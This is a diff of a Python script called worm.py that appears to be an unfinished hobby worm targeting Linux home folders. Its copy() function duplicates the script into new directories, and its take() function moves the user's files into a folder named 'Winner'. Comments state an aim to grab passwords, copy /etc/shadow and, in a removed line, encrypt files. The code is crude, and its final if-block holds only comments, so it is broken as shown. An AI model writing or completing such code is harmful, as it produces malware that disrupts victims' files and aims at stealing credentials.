@@ -13,7 +13,7 @@ from sys import argv #uses arguments
 import subprocess #allows you to use terminal commands 
 import shutil #allows use to do file movement
 
-print('I am staring in the void')
+
 
 
 def wiggle():
@@ -27,35 +27,40 @@ def wiggle():
     #the computer is linux 
     if(system == "Linux"):
         #get the current location
-        currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3
+        #currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3
 
         #need the username to properly get pathway names
         username = os.getlogin()
 
         #if the worm is in downloads
-        if(os.path.isdir("/home/"+username+"/Downloads/")):
-            take()
+        if(os.path.isdir("/home/"+username+"/Downloads/") == True):
+            #we go to that directory
+
+            #make a copy of the folder that holds the worm in it 
+
             copy()
-           
+
             #should I send it to another location
 
         #if the worm is in Documents
-        if(os.path.isdir("/home/"+username+"/Documents/")):
-            take()
+        if(os.path.isdir("/home/"+username+"/Pictures/") == True):
+
+            #we go to that directory
+
+            #make a copy of the folder that holds the worm in it 
+
             copy()
            
         #if its not in any of those two locations this person is weird grab me the passwords
         else:
             #send the worm to the /etc and copy the shadow file but that may need addditional permissions
             #for right now just take whatever
-            take()
             copy()
 
 def copy():
 
     #code begins the copy function of the worm which allows it to replicate on the users computer
 
-    print('I am staring in the copy')
     #began the worm copy method
     script = argv
 
@@ -64,7 +69,7 @@ def copy():
 
     #going to create the directory twice
     for i in range(0,1):
-        directoryName = 'The Game'
+        directoryName = 'You Lose'
         subprocess.call(['mkdir', directoryName])
         subprocess.call(['cp',name, directoryName])
 
@@ -74,9 +79,6 @@ def take():
     #get the username
     username = os.getlogin()
 
-    #get the worms location just in case I guess
-    location = os.path.abspath("worm.py")
-
     #check for the worm.py file
     #if os.path.exists('worm.py'):
         #get the directory path way
@@ -85,7 +87,7 @@ def take():
     #    copy()
 
     #create the folder there??
-    directory = 'You Lose'
+    directory = 'Winner'
     subprocess.call(['mkdir', directory]) #this is my destination file
 
     #copy all of the files in that directory
@@ -101,12 +103,25 @@ def take():
             #send all of those copies to a new file 
             shutil.move(full_name, directory)
 
-    #It's done moving those files now we encrypted
+    #It has taken from Documents
 
+    if(os.path.isdir("/home/"+username+"/Downloads/") == True):
+
+        #FOLLOW THE SAME PROCESS BUT TAKE FROM THAT FOLDER
+
+        #list the files in thar dirtory
+        
+        #loop through them
+            #make a full pathway 
+            #if it is a full pathway
+                #move those files to "winner"
 
 def main():
     print("NOW STARTING")
+    #wiggle()
     copy()
+    take()
+    print("GAME OVER")
 
 if __name__ == "__main__":
     main()
